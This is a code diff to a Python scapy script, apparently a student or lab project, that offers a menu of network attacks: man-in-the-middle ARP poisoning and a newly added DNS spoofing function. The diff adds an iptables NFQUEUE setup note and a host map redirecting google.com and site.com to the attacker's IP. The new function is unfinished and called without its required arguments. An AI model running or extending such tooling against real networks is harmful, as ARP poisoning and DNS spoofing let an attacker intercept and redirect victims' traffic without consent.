@@ -4,6 +4,8 @@
 
 # Imports
 from scapy.all import *
+from netfilterqueue import NetfilterQueue
+import os
 
 macVictimList = []
 ipVictimList = []
@@ -28,14 +30,13 @@ macAttacker = "08:00:27:D0:25:4B"
 def main():
     typeOfAttack = int(input("Choose your attack. \nType 1 for a MITM ARP poisoning attack.\nType 2 for a DNS spoofing attack.\nType of attack: "))
     if (typeOfAttack == 1):
-        arppoison()
+        arp_poison()
     elif (typeOfAttack == 2):
-        print("This function has not been implemented yet.")
-		#dnsSpoof()
+		dns_spoof()
     else:
         print("No or wrong input.")
 
-def arppoison():
+def arp_poison():
     # The user is given the option to choose how many hosts will be attacked during the ARP poisoning attack.
     nrOfHosts = int(input("The number of hosts you want to ARP poison: "))
 
@@ -103,6 +104,20 @@ def forward_packet(packet):
             sendp(packet)
             # Let the attacker know who sent a packet to whom
             print("A packet from " + str(packet[ARP].psrc) + " has been redirected to " + str(packet[ARP].pdst))
+
+# To Do before you are able to run this method succesfully
+#
+# In terminal:
+# iptables -I FORWARD -j NFQUEUE --queue-num 0
+# pip3 install netfilterqueue scapy
+def dns_spoof(ipVictim, ipAttacker, ipGatewayRouter):
+
+    # Define hosts which we want to spoof
+    dns_hosts = {
+        b"www.google.com.": ipAttacker,
+        b"google.com.": ipAttacker,
+        b"site.com.": ipAttacker
+    }
 
 
 main()
